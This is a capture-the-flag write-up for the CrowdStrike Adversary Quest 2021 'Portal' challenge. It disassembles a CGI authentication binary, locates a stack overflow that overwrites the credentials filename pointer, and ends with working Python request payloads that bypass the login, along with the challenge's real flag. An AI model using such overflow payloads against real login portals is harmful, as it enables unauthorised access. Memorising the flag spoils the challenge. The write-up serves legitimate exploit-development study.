# Crowdstrike Adversary Quest 2021 / Protective Penguin / #1 Portal

## Challenge Description
PROTECTIVE PENGUIN gained access to one of their victims through the victim's extranet authentication portals and we were asked to investigate.
Please download the Portal Code and see whether you can reproduce their means of initial access vector. We stood up a test instance of the authentication portal for you to validate against.
NOTE: Flags will be easily identifiable by following the format CS{some_secret_flag_text}. They must be submitted in full, including the CS{ and } parts.

## Authentication Portal, Local Files
The archive for the test instance contains the following files:
```
./index.html
./run.sh
./cgi-bin
./cgi-bin/portal.cgi
./creds.txt
```

For testing purposes, use run.sh to fire up a local webserver through python...
```
#!/bin/sh
export FLAG=CS{foobar}
python3 -m http.server --cgi --bind 127.0.0.1
```
```
./run.sh 
Serving HTTP on 127.0.0.1 port 8000 (http://127.0.0.1:8000/) ...
```
... serving a rather simple web page resembling a VPN login.
![VPN login page](pics/1.png)

### Page Source
The login form uses an inline Javascript function *auth()* on submitting data for the fields *input_username* and *input_password*...
```javascript
function auth() {
  let creds = {
    user: btoa(document.getElementById("input_username").value),
    pass: btoa(document.getElementById("input_password").value)
  };
  if (!creds.user) {
    notification("Empty username", "warning");
    return;
  }
  if (!creds.pass) {
    notification("Empty password", "warning");
    return;
  }

  fetch("/cgi-bin/portal.cgi", {
    method: "POST",
    body: JSON.stringify(creds),
  }).then(function (response) {
    return response.text();
  }).then(function (data) {
    let json = JSON.parse(data);
    if (json.status == "success") {
      notification(`Login success: ${json.flag}`, "success");
[...]
```
... which base64 encodes both field values and delivers them via HTTP POST as JSON to the CGI program */cgi-bin/portal.cgi*.
A test run with admin/admin creds looks like this:
```json
{"user":"YWRtaW4=","pass":"YWRtaW4="}
```

The web page and the Javascript do not seem to be vulnerable, so the attention is on to portal.cgi!

### Portal CGI, Checksec
A little glance at program security features with checksec never hurts...
```
/usr/bin/checksec --file=cgi-bin/portal.cgi
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               3               cgi-bin/portal.cgi
```
... and shows usage of stack canaries but also no PIE (position independent executable). So the base code might not make use of ASLR (address space layout randomization), which could be a first wink.

### Portal CGI, Binary info
Gathering some ELF infos with readelf yields program entry point **0x401140** (no ASLR).
```
readelf -a cgi-bin/portal.cgi 
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x401140
```
Quickly identify entrypoint of function *main* via rabin2
```
rabin2 -M cgi-bin/portal.cgi 
[Main]
vaddr=0x00401434 paddr=0x00401434
```

Use radare2 to graph basic blocks of function *main*
```
r2 -q -c "aaa;s main; agf" cgi-bin/portal.cgi 
[0x00401434]>  # int main (int argc, char **argv, char **envp);
                   ┌──────────────────────────────────────────────────────┐
                   │  0x401434                                            │
                   │   ; DATA XREF from entry0 @ 0x401161                 │
                   │ 655: int main (int argc, char **argv, char **envp);  │
                   │ ; var char **var_458h @ rbp-0x458                    │
                   │ ; var char **var_450h @ rbp-0x450                    │
                   │ ; var int64_t var_444h @ rbp-0x444                   │
                   │ ; var signed int64_t var_43ch @ rbp-0x43c            │
                   │ ; var int64_t var_438h @ rbp-0x438                   │
                   │ ; var int64_t var_430h @ rbp-0x430                   │
                   │ ; var uint32_t var_428h @ rbp-0x428                  │
                   │ ; var uint32_t var_420h @ rbp-0x420                  │
                   │ ; var uint32_t var_418h @ rbp-0x418                  │
                   │ ; var void *ptr @ rbp-0x410                          │
                   │ ; var int64_t var_408h @ rbp-0x408                   │
                   │ ; var char *s @ rbp-0x400                            │
                   │ ; var int64_t canary @ rbp-0x8                       │
                   │ ; arg int argc @ rdi                                 │
                   │ ; arg char **argv @ rsi                              │
                   │ ; arg char **envp @ rdx                              │
                   │ push rbp                                             │
                   │ mov rbp, rsp                                         │
                   │ sub rsp, 0x460                                       │
                   │ ; argc                                               │
                   │ mov dword [var_444h], edi                            │
                   │ ; argv                                               │
                   │ mov qword [var_450h], rsi                            │
                   │ ; envp                                               │
                   │ mov qword [var_458h], rdx                            │
                   │ mov rax, qword fs:[0x28]                             │
                   │ mov qword [canary], rax                              │
                   │ xor eax, eax                                         │
                   │ mov qword [var_428h], 0                              │
                   │ mov qword [var_420h], 0                              │
                   │ mov qword [ptr], 0                                   │
                   │ mov qword [var_408h], 0                              │
                   │ lea rdx, [s]                                         │
                   │ mov eax, 0                                           │
                   │ ; '~'                                                │
                   │ ; 126                                                │
                   │ mov ecx, 0x7e                                        │
                   │ mov rdi, rdx                                         │
                   │ rep stosq qword [rdi], rax                           │
                   │ ; const char *s                                      │
                   │ ; 0x402018                                           │
                   │ ; "Content-Type: application/json\r\n\r"             │
                   │ lea rdi, str.Content_Type:_application_json_r_n_r    │
                   │ ; int puts(const char *s)                            │
                   │ call sym.imp.puts;[oa]                               │
                   │ ; const char *name                                   │
                   │ ; 0x40203a                                           │
                   │ ; "REQUEST_METHOD"                                   │
                   │ lea rdi, str.REQUEST_METHOD                          │
                   │ ; char *getenv(const char *name)                     │
                   │ call sym.imp.getenv;[ob]                             │
                   │ ; const char *s2                                     │
                   │ ; 0x402049                                           │
                   │ ; "POST"                                             │
                   │ lea rsi, str.POST                                    │
                   │ ; const char *s1                                     │
                   │ mov rdi, rax                                         │
                   │ ; int strcmp(const char *s1, const char *s2)         │
                   │ call sym.imp.strcmp;[oc]                             │
                   │ test eax, eax                                        │
                   │ je 0x4014eb                                          │
                   └──────────────────────────────────────────────────────┘
                           f t
                           │ │                                                                                                                                                                               
                           │ └──────────────────────────┐                                                                                                                                                    
    ┌──────────────────────┘                            │                                                                                                                                                    
    │                                                   │                                                                                                                                                    
┌───────────────────────────────────────────────┐   ┌──────────────────────────────────┐                                                                                                                     
│  0x4014d0                                     │   │  0x4014eb                        │
│ ; const char *format                          │   │ ; const char *name               │
│ ; 0x402050                                    │   │ ; CODE XREF from main @ 0x4014ce │
│ ; "{\"status\": \"unexpected-method\"}"       │   │ ; 0x402070                       │
│ lea rdi, str._status_:__unexpected_method_    │   │ ; "CONTENT_LENGTH"               │
│ mov eax, 0                                    │   │ lea rdi, str.CONTENT_LENGTH      │
│ ; int printf(const char *format)              │   │ ; char *getenv(const char *name) │
│ call sym.imp.printf;[od]                      │   │ call sym.imp.getenv;[ob]         │
│ ; -1                                          │   │ ; const char *str                │
│ mov eax, 0xffffffff                           │   │ mov rdi, rax                     │
│ jmp 0x4016ad                                  │   │ ; int atoi(const char *str)      │
└───────────────────────────────────────────────┘   │ call sym.imp.atoi;[oe]           │
    v                                               │ mov dword [var_43ch], eax        │
    │                                               │ cmp dword [var_43ch], 0          │
    │                                               │ js 0x40151b                      │
    │                                               └──────────────────────────────────┘
    │                                                       f t
    │                                                       │ │                                                                                                                                              
    └─────────────────────────────┐                         │ │                                                                                                                                              
                                  │                         │ └───────────┐                                                                                                                                  
                                  │       ┌─────────────────┘             │                                                                                                                                  
                                  │       │                               │                                                                                                                                  
                                  │   ┌──────────────────────────────┐    │                                                                                                                                  
                                  │   │  0x40150e                    │    │                                                                                                                                  
                                  │   │ mov eax, dword [var_43ch]    │    │                                                                                                                                  
                                  │   │ ; 1023                       │    │                                                                                                                                  
                                  │   │ cmp eax, 0x3ff               │    │                                                                                                                                  
                                  │   │ jbe 0x401536                 │    │                                                                                                                                  
                                  │   └──────────────────────────────┘    │                                                                                                                                  
                                  │           f t                         │                                                                                                                                  
                                  │           │ │                         │                                                                                                                                  
                                  │           │ └──┐                      │                                                                                                                                  
                                  │           └───────────────────────────│──────────────────────────────────────────────────────────────┐                                                                   
                                  │                │                      └────────────────────────────────────────────────────────────────┐                                                                 
                                  │                │                                                                                     │ │                                                                 
                                  │            ┌────────────────────────────────────────────────────────────────────┐              ┌────────────────────────────────────────────────────┐                    
                                  │            │  0x401536                                                          │              │  0x40151b                                          │
                                  │            │ ; FILE *stream                                                     │              │ ; const char *format                               │
                                  │            │ ; CODE XREF from main @ 0x401519                                   │              │ ; CODE XREF from main @ 0x40150c                   │
                                  │            │ ; [0x4040b0:8]=0                                                   │              │ ; 0x402080                                         │
                                  │            │ mov rcx, qword [obj.stdin]                                         │              │ ; "{\"status\": \"invalid-content-length\"}"       │
                                  │            │ mov eax, dword [var_43ch]                                          │              │ lea rdi, str._status_:__invalid_content_length_    │
                                  │            │ ; size_t nmemb                                                     │              │ mov eax, 0                                         │
                                  │            │ movsxd rdx, eax                                                    │              │ ; int printf(const char *format)                   │
                                  │            │ lea rax, [ptr]                                                     │              │ call sym.imp.printf;[od]                           │
                                  │            │ ; size_t size                                                      │              │ ; -1                                               │
                                  │            │ mov esi, 1                                                         │              │ mov eax, 0xffffffff                                │
                                  │            │ ; void *ptr                                                        │              │ jmp 0x4016ad                                       │
                                  │            │ mov rdi, rax                                                       │              └────────────────────────────────────────────────────┘
                                  │            │ ; size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream) │                  v
                                  │            │ call sym.imp.fread;[of]                                            │                  │                                                                     
                                  │            │ mov edx, dword [var_43ch]                                          │                  │                                                                     
                                  │            │ movsxd rdx, edx                                                    │                  │                                                                     
                                  │            │ cmp rax, rdx                                                       │                  │                                                                     
                                  │            │ je 0x401572                                                        │                  │                                                                     
                                  │            └────────────────────────────────────────────────────────────────────┘                  │                                                                     
                                  │                    f t                                                                             │                                                                     
                                  │                    │ │                                                                             │                                                                     
                                  │                    │ │                                                                             └──────────────────────┐                                              
                                  │                    │ └────────────────────────────────────────┐                                                           │                                              
                                  │       ┌────────────┘                                          │                                                           │                                              
                                  │       │                                                       │                                                           │                                              
                                  │   ┌────────────────────────┐                              ┌──────────────────────────────────────┐                        │                                              
                                  │   │  0x401568              │                              │  0x401572                            │                        │                                              
                                  │   │ ; -1                   │                              │ ; CODE XREF from main @ 0x401566     │                        │                                              
                                  │   │ mov eax, 0xffffffff    │                              │ lea rax, [ptr]                       │                        │                                              
                                  │   │ jmp 0x4016ad           │                              │ mov rdi, rax                         │                        │                                              
                                  │   └────────────────────────┘                              │ call sym.imp.json_tokener_parse;[og] │                        │                                              
                                  │       v                                                   │ mov qword [var_418h], rax            │                        │                                              
                                  │       │                                                   │ mov qword [var_438h], 0              │                        │                                              
                                  │       │                                                   │ mov qword [var_430h], 0              │                        │                                              
                                  │       │                                                   │ cmp qword [var_418h], 0              │                        │                                              
                                  │       │                                                   │ je 0x401688                          │                        │                                              
                                  │       │                                                   └──────────────────────────────────────┘                        │                                              
                                  │       │                                                           f t                                                     │                                              
                                  │       │                                                           │ │                                                     │                                              
                                  │   ┌───┘                                                           │ │                                                     │                                              
                                  │   │                                                               │ └───────────────────────┐                             │                                              
                                  │   │                                           ┌───────────────────┘                         │                             │                                              
                                  │   │                                           │                                             │                             │                                              
                                  │   │                                       ┌─────────────────────────────────────────────┐   │                             │                                              
                                  │   │                                       │  0x4015ac                                   │   │                             │                                              
                                  │   │                                       │ lea rdx, [var_438h]                         │   │                             │                                              
                                  │   │                                       │ mov rax, qword [var_418h]                   │   │                             │                                              
                                  │   │                                       │ ; 0x4020a5                                  │   │                             │                                              
                                  │   │                                       │ ; "user"                                    │   │                             │                                              
                                  │   │                                       │ lea rsi, str.user                           │   │                             │                                              
                                  │   │                                       │ mov rdi, rax                                │   │                             │                                              
                                  │   │                                       │ call sym.imp.json_object_object_get_ex;[oh] │   │                             │                                              
                                  │   │                                       │ test eax, eax                               │   │                             │                                              
                                  │   │                                       │ je 0x401688                                 │   │                             │                                              
                                  │   │                                       └─────────────────────────────────────────────┘   │                             │                                              
                                  │   │                                               f t                                       │                             │                                              
                                  │   │                                               │ │                                       │                             │                                              
                                  │   │                                               │ └───────────────────────────────────┐   │                             │                                              
                                  │   │                                       ┌───────┘                                     │   │                             │                                              
                                  │   │                                       │                                             │   │                             │                                              
                                  │   │                                   ┌─────────────────────────────────────────────┐   │   │                             │                                              
                                  │   │                                   │  0x4015d1                                   │   │   │                             │                                              
                                  │   │                                   │ lea rdx, [var_430h]                         │   │   │                             │                                              
                                  │   │                                   │ mov rax, qword [var_418h]                   │   │   │                             │                                              
                                  │   │                                   │ ; 0x4020aa                                  │   │   │                             │                                              
                                  │   │                                   │ ; "pass"                                    │   │   │                             │                                              
                                  │   │                                   │ lea rsi, str.pass                           │   │   │                             │                                              
                                  │   │                                   │ mov rdi, rax                                │   │   │                             │                                              
                                  │   │                                   │ call sym.imp.json_object_object_get_ex;[oh] │   │   │                             │                                              
                                  │   │                                   │ test eax, eax                               │   │   │                             │                                              
                                  │   │                                   │ je 0x401688                                 │   │   │                             │                                              
                                  │   │                                   └─────────────────────────────────────────────┘   │   │                             │                                              
                                  │   │                                           f t                                       │   │                             │                                              
                                  │   │                                           │ │                                       │   │                             │                                              
                                  │   │                                           │ └───────────────────────────────────┐   │   │                             │                                              
                                  │   │                                     ┌─────┘                                     │   │   │                             │                                              
                                  │   │                                     │                                           │   │   │                             │                                              
                                  │   │                                 ┌──────────────────────────────────────────┐    │   │   │                             │                                              
                                  │   │                                 │  0x4015f6                                │    │   │   │                             │                                              
                                  │   │                                 │ mov rax, qword [var_438h]                │    │   │   │                             │                                              
                                  │   │                                 │ mov rdi, rax                             │    │   │   │                             │                                              
                                  │   │                                 │ call sym.imp.json_object_get_string;[oi] │    │   │   │                             │                                              
                                  │   │                                 │ mov qword [var_428h], rax                │    │   │   │                             │                                              
                                  │   │                                 │ cmp qword [var_428h], 0                  │    │   │   │                             │                                              
                                  │   │                                 │ je 0x401688                              │    │   │   │                             │                                              
                                  │   │                                 └──────────────────────────────────────────┘    │   │   │                             │                                              
                                  │   │                                         f t                                     │   │   │                             │                                              
                                  │   │                                         │ │                                     │   │   │                             │                                              
                                  │   │                                         │ └─────────────────────────────────┐   │   │   │                             │                                              
                                  │   │                              ┌──────────┘                                   │   │   │   │                             │                                              
                                  │   │                              │                                              │   │   │   │                             │                                              
                                  │   │                          ┌──────────────────────────────────────────┐       │   │   │   │                             │                                              
                                  │   │                          │  0x401616                                │       │   │   │   │                             │                                              
                                  │   │                          │ mov rax, qword [var_430h]                │       │   │   │   │                             │                                              
                                  │   │                          │ mov rdi, rax                             │       │   │   │   │                             │                                              
                                  │   │                          │ call sym.imp.json_object_get_string;[oi] │       │   │   │   │                             │                                              
                                  │   │                          │ mov qword [var_420h], rax                │       │   │   │   │                             │                                              
                                  │   │                          │ cmp qword [var_420h], 0                  │       │   │   │   │                             │                                              
                                  │   │                          │ je 0x401688                              │       │   │   │   │                             │                                              
                                  │   │                          └──────────────────────────────────────────┘       │   │   │   │                             │                                              
                                  │   │                                  f t                                        │   │   │   │                             │                                              
                                  │   │                                  │ │                                        │   │   │   │                             │                                              
                                  │   │                                  │ └────────┐                               │   │   │   │                             │                                              
                                  │   │       ┌──────────────────────────┘          │                               │   │   │   │                             │                                              
                                  │   │       │                                     │ ┌─────────────────────────────┘   │   │   │                             │                                              
                                  │   │       │                                     │ │ ┌───────────────────────────────┘   │   │                             │                                              
                                  │   │       │                                     │ │ │ ┌─────────────────────────────────┘   │                             │                                              
                                  │   │       │                                     │ │ │ │ ┌───────────────────────────────────┘                             │                                              
                                  │   │       │                                     │ │ │ │ │                                                                 │                                              
                                  │   │   ┌──────────────────────────────┐    ┌───────────────────────────────────────────────────────────────────────────┐   │                                              
                                  │   │   │  0x401636                    │    │  0x401688                                                                 │   │                                              
                                  │   │   │ mov rdx, qword [var_420h]    │    │ ; const char *format                                                      │   │                                              
                                  │   │   │ mov rax, qword [var_428h]    │    │ ; CODE XREFS from main @ 0x4015a6, 0x4015cb, 0x4015f0, 0x401614, 0x401634 │   │                                              
                                  │   │   │ ; int64_t arg2               │    │ ; 0x4020ee                                                                │   │                                              
                                  │   │   │ mov rsi, rdx                 │    │ ; "{\"status\": \"invalid-json\"}"                                        │   │                                              
                                  │   │   │ ; int64_t arg1               │    │ lea rdi, str._status_:__invalid_json_                                     │   │                                              
                                  │   │   │ mov rdi, rax                 │    │ mov eax, 0                                                                │   │                                              
                                  │   │   │ call fcn.00401226;[oj]       │    │ ; int printf(const char *format)                                          │   │                                              
                                  │   │   │ test eax, eax                │    │ call sym.imp.printf;[od]                                                  │   │                                              
                                  │   │   │ jne 0x401675                 │    └───────────────────────────────────────────────────────────────────────────┘   │                                              
                                  │   │   └──────────────────────────────┘        v                                                                           │                                              
                                  │   │           f t                             │                                                                           │                                              
                                  │   │           │ │                             │                                                                           │                                              
                                  │   │           │ └─────────────────────────────│───────────────────────────┐                                               │                                              
                                  │   │           └───┐                           │                           │                                               │                                              
                                  │   │               │                           └───────────────────────────────────────────────────────────────┐           │                                              
                                  │   │               │                                                       │                                   │           │                                              
                                  │   │           ┌───────────────────────────────────────────────────┐   ┌──────────────────────────────────┐    │           │                                              
                                  │   │           │  0x401653                                         │   │  0x401675                        │    │           │                                              
                                  │   │           │ ; const char *name                                │   │ ; const char *format             │    │           │                                              
                                  │   │           │ ; 0x4020af                                        │   │ ; CODE XREF from main @ 0x401651 │    │           │                                              
                                  │   │           │ ; "FLAG"                                          │   │ ; 0x4020dc                       │    │           │                                              
                                  │   │           │ lea rdi, str.FLAG                                 │   │ ; "{\"status\": \"err\"}"        │    │           │                                              
                                  │   │           │ ; char *getenv(const char *name)                  │   │ lea rdi, str._status_:__err_     │    │           │                                              
                                  │   │           │ call sym.imp.getenv;[ob]                          │   │ mov eax, 0                       │    │           │                                              
                                  │   │           │ mov rsi, rax                                      │   │ ; int printf(const char *format) │    │           │                                              
                                  │   │           │ ; const char *format                              │   │ call sym.imp.printf;[od]         │    │           │                                              
                                  │   │           │ ; 0x4020b8                                        │   │ jmp 0x401699                     │    │           │                                              
                                  │   │           │ ; "{\"status\": \"success\", \"flag\": \"%s\"}"   │   └──────────────────────────────────┘    │           │                                              
                                  │   │           │ lea rdi, str._status_:__success____flag_:___s_    │       v                                   │           │                                              
                                  │   │           │ mov eax, 0                                        │       │                                   │           │                                              
                                  │   │           │ ; int printf(const char *format)                  │       │                                   │           │                                              
                                  │   │           │ call sym.imp.printf;[od]                          │       │                                   │           │                                              
                                  │   │           │ jmp 0x401699                                      │       │                                   │           │                                              
                                  │   │           └───────────────────────────────────────────────────┘       │                                   │           │                                              
                                  │   │               v                                                       │                                   │           │                                              
                                  │   │               │                                                       │                                   │           │                                              
                                  │   │               └──────────────────────────────────────┐                │                                   │           │                                              
                                  │   │                                                      │ ┌──────────────┘                                   │           │                                              
                                  │   │                                                      │ │ ┌────────────────────────────────────────────────┘           │                                              
                                  │   │                                                      │ │ │                                                            │                                              
                                  │   │                                                ┌─────────────────────────────────────────────┐                        │                                              
                                  │   │                                                │  0x401699                                   │                        │                                              
                                  │   │                                                │ ; CODE XREFS from main @ 0x401673, 0x401686 │                        │                                              
                                  │   │                                                │ mov rax, qword [var_418h]                   │                        │                                              
                                  │   │                                                │ mov rdi, rax                                │                        │                                              
                                  │   │                                                │ call sym.imp.json_object_put;[ok]           │                        │                                              
                                  │   │                                                │ mov eax, 0                                  │                        │                                              
                                  │   │                                                └─────────────────────────────────────────────┘                        │                                              
                                  │   │                                                    v                                                                  │                                              
                                  │   │                                                    │                                                                  │                                              
                                  │   │                        ┌───────────────────────────┘                                                                  │                                              
                                  └───│──────────────────────────┐                                                                                            │                                              
                                      │                        │ │ ┌──────────────────────────────────────────────────────────────────────────────────────────┘                                              
                                      └──────────────────────────────┐                                                                                                                                       
                                                               │ │ │ │                                                                                                                                       
                                                         ┌───────────────────────────────────────────────────────┐                                                                                           
                                                         │  0x4016ad                                             │
                                                         │ ; CODE XREFS from main @ 0x4014e6, 0x401531, 0x40156d │
                                                         │ mov rcx, qword [canary]                               │
                                                         │ sub rcx, qword fs:[0x28]                              │
                                                         │ je 0x4016c1                                           │
                                                         └───────────────────────────────────────────────────────┘
                                                                 f t
                                                                 │ │                                                                                                                                         
                                                                 │ └────────────────────────┐                                                                                                                
                                                  ┌──────────────┘                          │                                                                                                                
                                                  │                                         │                                                                                                                
                                              ┌────────────────────────────────────┐    ┌──────────────────────────────────┐                                                                                 
                                              │  0x4016bc                          │    │  0x4016c1                        │
                                              │ ; void __stack_chk_fail(void)      │    │ ; CODE XREF from main @ 0x4016ba │
                                              │ call sym.imp.__stack_chk_fail;[ol] │    │ leave                            │
                                              └────────────────────────────────────┘    │ ret                              │
                                                                                        └──────────────────────────────────┘
```



high level:
main -> calls validate_creds with params b64_user, b64_pass
validate opens creds.txt, reads line by line, compares for valid creds
validate_creds returns 0 on success
main -> print flag on success

validate_creds has stack laylout
.text:0000000000401226                   lpb64password= qword ptr -240h
.text:0000000000401226                   lpb64username= qword ptr -238h
.text:0000000000401226                   stream= qword ptr -230h
.text:0000000000401226                   length_of_current_creds_line= qword ptr -228h
.text:0000000000401226                   var_220= dword ptr -220h
.text:0000000000401226                   var_21C= byte ptr -21Ch
.text:0000000000401226                   filename= qword ptr -18h
.text:0000000000401226                   stackCookie= qword ptr -8

var_220 is used as exit value (0 for success)
parsing of server local creds.txt happens line by line, reading up to 100h bytes with fgets into var_220 + 4 (range variable from -21Ch up to -11Dh)
b64 decoded username (up to 100h) bytes are saved to var_220 + 104 (range variable, from -11Ch up to -1Dh)
then a colon is added to decoded username (with max username length, e.g. at -1Ch)
b64 decoded password (up to 100h) bytes are saved to var_220 + 104 + strlen(username) + 1
with max size username from -1B up to and beyond stack frame border.


rabin2 -zz cgi-bin/portal.cgi 
[Strings]
nth paddr      vaddr      len size section   type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000034 0x00000034 5   12             utf16le @8\v@\e
1   0x000002a8 0x004002a8 27  28   .interp   ascii   /lib64/ld-linux-x86-64.so.2


strings -t x portal.cgi
    2a8 /lib64/ld-linux-x86-64.so.2

LOAD:00000000004002A8 aLib64LdLinuxX8 db '/lib64/ld-linux-x86-64.so.2',0

nope: its the right way, only path in non-dynamic memory is
fill up pass with \0 and then overwrite filename with offset $rax  : 0x00000000004002a8 → "/lib64/ld-linux-x86-64.so.2"

-> goal: user:pass combo to overwrite filename offset with 0x00000000004002a8
try with debug

ps auxwwg
kali      741831  0.0  0.0   2416   372 pts/0    S+   20:16   0:00 /bin/sh ./run.sh
kali      741832  0.0  0.9 245352 13628 pts/0    S+   20:16   0:01 python3 -m http.server --cgi --bind 127.0.0.1

gdb -p 741832

set follow-fork-mode child
set detach-on-fork off
b *0x401434     # main
b *0x401226     # validate_creds (see i64)
b *0x040131A    # fopen

gef➤  continue 
Continuing.
[New Thread 0x7fecaa6b6700 (LWP 743153)]
[Attaching after Thread 0x7fecaa6b6700 (LWP 743153) fork to child process 743154]
[New inferior 2 (process 743154)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Reading symbols from /usr/lib/debug/.build-id/2c/c4e3a93e8ef0f4dee8f77225701d988f97b9c7.debug...
Reading symbols from /usr/lib/debug/.build-id/5b/d08b8a2b8511c50cc5e38aac39305cfcae72f0.debug...
Reading symbols from /usr/lib/debug/.build-id/f5/efbcea815d5c6da19e62263f67ca63f8bedeb6.debug...
Reading symbols from /usr/lib/debug/.build-id/e8/ef1ac73913c5833fc0088ea41bc3331db60ae2.debug...
Reading symbols from /usr/lib/debug/.build-id/a5/a3c3f65fd94f4c7f323a175707c3a79cbbd614.debug...
Reading symbols from /usr/lib/debug/.build-id/63/7706dbbbd112d03fbad61ca30125b48e60aa92.debug...
Reading symbols from /usr/lib/debug/.build-id/a4/94b325fdefe9742c94fcd34c583c08733d2318.debug...
process 743154 is executing new program: /mnt/hgfs/Crowdstrike-Adversary-Quest-2021/protective penguin/portal/authportal/cgi-bin/portal.cgi
Reading symbols from /usr/lib/debug/.build-id/63/7706dbbbd112d03fbad61ca30125b48e60aa92.debug...
Reading symbols from /usr/lib/debug/.build-id/97/0fa8cc35554ed6f4feb2d663067310d48cadb4.debug...
Reading symbols from /usr/lib/debug/.build-id/a5/a3c3f65fd94f4c7f323a175707c3a79cbbd614.debug...
[Switching to process 743154]

Thread 2.1 "portal.cgi" hit Breakpoint 1, 0x0000000000401434 in ?? ()

# first line read with fgets from /lib64/...

00001420: 0348 8d3c 9248 01ff 4829 f841 0fb6 3c01  .H.<.H..H).A..<.
00001430: 4889 c848 89d1 4188 3a48 83f8 0977 d14c  H..H..A.:H...w.L
00001440: 89d8 ba19 0000 0049 89e3 4c29 d048 83f8  .......I..L).H..

gef➤  x/200x $rsi
0x7ffde4289cd4: 0x48    0x29    0xf8    0x41    0x0f    0xb6    0x3c    0x01
0x7ffde4289cdc: 0x48    0x89    0xc8    0x48    0x89    0xd1    0x41    0x88
0x7ffde4289ce4: 0x3a    0x48    0x83    0xf8    0x09    0x77    0xd1    0x4c
0x7ffde4289cec: 0x89    0xd8    0xba    0x19    0x00    0x00    0x00    0x49

we have 16 chars for username, colon, and then 11 chars pass before first \0
fill up pass with \0 and then overwrite filename with offset $rax  : 0x00000000004002a8 → "/lib64/ld-linux-x86-64.so.2"

>>> import requests
>>> from base64 import b64encode
>>> import json
>>> data['user'] = b64encode(b'\x48\x29\xf8\x41\x0f\xb6\x3c\x01\x48\x89\xc8\x48\x89\xd1\x41\x88').decode('utf-8')
>>> data['pass'] = b64encode(b'\x48\x83\xf8\x09\x77\xd1\x4c\x89\xd8\xba\x19' + b'\x00'*232 + b'\xa8\x02\x40').decode('utf-8')
>>> requests.post('http://127.0.0.1:8000/cgi-bin/portal.cgi', data=json.dumps(data)).text
'{"status": "success", "flag": "CS{foobar}"}'

>>> requests.post('https://authportal.challenges.adversary.zone:8880/cgi-bin/portal.cgi', data=json.dumps(data)).text
'{"status": "err"}'

exploit works locally, but seems to fail on remote server
-> could be because the /lib64/ link is a soft link and might be a different version on server?
-> some memory issue?

grep for more colons, which might be less library version dependent

00022460: 6b00 0a70 7265 6c69 6e6b 2063 6865 636b  k..prelink check
00022470: 696e 673a 2025 730a 0066 6169 6c65 6400  ing: %s..failed.

>>> data['user'] = b64encode(b'prelink checking').decode('utf-8')
>>> data['pass'] = b64encode(b' %s' + b'\x00'*(260-16-1-3) + b'\xa8\x02\x40').decode('utf-8')
>>> requests.post('http://127.0.0.1:8000/cgi-bin/portal.cgi', data=json.dumps(data)).text
'{"status": "success", "flag": "CS{foobar}"}'
>>> requests.post('https://authportal.challenges.adversary.zone:8880/cgi-bin/portal.cgi', data=json.dumps(data)).text
'{"status": "success", "flag": "CS{w3b_vPn_h4xx}"}'

flag: CS{w3b_vPn_h4xx}
